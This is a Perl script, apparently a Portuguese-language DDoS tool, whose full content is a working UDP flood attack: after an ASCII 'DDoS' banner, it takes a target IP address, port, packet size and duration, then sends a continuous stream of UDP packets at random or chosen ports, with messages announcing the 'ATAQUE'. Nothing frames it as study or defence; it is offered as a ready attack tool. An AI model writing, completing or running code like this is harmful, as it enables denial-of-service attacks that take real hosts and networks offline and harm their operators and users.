#!/usr/bin/perl
 
##############
# mu7h UDP
##############
 
use Socket;
use strict;
use Term::ANSIColor qw(:constants);

print GREEN, '                   
    $$$$$$\     $$\      $$\           $$$$$$$$\ $$\                          
  $$$ ___$$$\   $$$\    $$$ |          \____$$  |$$ |                                 
 $$ _/   \_$$\  $$$$\  $$$$ |$$\   $$\     $$  / $$$$$$$\                             
$$ / $$$$$\ $$\ $$\$$\$$ $$ |$$ |  $$ |   $$  /  $$  __$$\                            
$$ |$$  $$ |$$ |$$ \$$$  $$ |$$ |  $$ |  $$  /   $$ |  $$ |                           
$$ |$$ /$$ |$$ |$$ |\$  /$$ |$$ |  $$ | $$  /    $$ |  $$ |                           
$$ |\$$$$$$$$  |$$ | \_/ $$ |\$$$$$$  |$$  /     $$ |  $$ |                   
\$$\ \________/ \__|     \__| \______/ \__/      \__|  \__|                        
 \$$$\   $$$\                                                                     
  \_$$$$$$  _|                                                               
    \______/                
$$$$$$$\  $$$$$$$\             $$$$$$\                                                       
$$  __$$\ $$  __$$\           $$  __$$\                                               
$$ |  $$ |$$ |  $$ | $$$$$$\  $$ /  \__|                                      
$$ |  $$ |$$ |  $$ |$$  __$$\ \$$$$$$\                                        
$$ |  $$ |$$ |  $$ |$$ /  $$ | \____$$\                                         
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |                                      
$$$$$$$  |$$$$$$$  |\$$$$$$  |\$$$$$$  |                                      
\_______/ \_______/  \______/  \______/

', RESET;
print "\n";
 
if ($#ARGV != 3) {
  print BLUE, "mu7h.pl <ip> <porta> <power> <tempo>\n", RESET;
  print BLUE, " porta=0: use para uma porta aleatoria\n", RESET;
  print BLUE, " power=0: use para um power nao definido entre 64 e 1024\n", RESET;
  print BLUE, " tempo=0: continue o flood sem parar\n", RESET;
  print RED, "Quer parar o ATAQUE?! Use Ctrl-C\n", RESET;
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Não pode resolver o nome do host $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print "Atacando $ip " . ($port ? $port : "random") . " porta " .
  ($size ? "$size-bytes" : "random size") . " pacotes" .
  ($time ? " por $time segundos. " : "") . "\n";
print "Pare o Ataque usando Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}